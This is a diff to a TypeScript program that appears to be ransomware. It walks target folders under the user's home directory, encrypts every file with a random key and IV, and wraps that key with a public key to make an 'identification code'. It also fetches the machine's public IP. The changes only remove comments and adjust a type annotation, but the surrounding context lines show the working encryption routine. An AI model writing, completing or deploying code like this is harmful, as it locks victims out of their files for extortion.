@@ -4,6 +4,7 @@ import crypto from 'crypto';
 import path from 'path';
 import config from './config.json';
 import https from 'https';
+
 const encrypt = () => {
   const userName: string = os.userInfo().username;
   console.log(userName);
@@ -11,20 +12,17 @@ const encrypt = () => {
 
   console.log('Starting...\n');
 
-  // create key
   const key: string = createRandomString(32);
   const iv: Buffer = crypto.randomBytes(16);
 
   console.log('Encrypted Files :');
 
-  // encrypt files recursively
   for (let i = 0; i < config.targetFolder.length; i++) {
     console.log(i, config.targetFolder[i]);
     encryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
   }
   console.log('\nEncryption Finished!\n');
 
-  // create identification code
   const keyData: string = `${key}${iv.toString('hex')}`;
   const idCode: string = encryptPublicKey(keyData);
 
@@ -44,7 +42,6 @@ const createRandomString = (length: number): string => {
 };
 
 const encryptDir = (dir: string, key: string, iv: Buffer) => {
-  // if directory does not exist
   if (!fs.existsSync(dir)) return;
 
   fs.readdirSync(dir).forEach((file) => {
@@ -52,13 +49,8 @@ const encryptDir = (dir: string, key: string, iv: Buffer) => {
       const fullPath: string = path.join(dir, file);
 
       if (fs.lstatSync(fullPath).isDirectory()) {
-        // if folder
-
-        // recursive call
         encryptDir(fullPath, key, iv);
       } else {
-        // if file
-
         let isTarget: boolean = true;
 
         // FODA SE EXTENSÃO
@@ -127,7 +119,8 @@ const getPublicIP = () => {
           try {
             const result = JSON.parse(data);
             resolve(result.ip);
-          } catch (err: string | any) {
+            // @ts-ignore
+          } catch (err: any) {
             reject('Erro ao parsear resposta: ' + err.message);
           }
         });
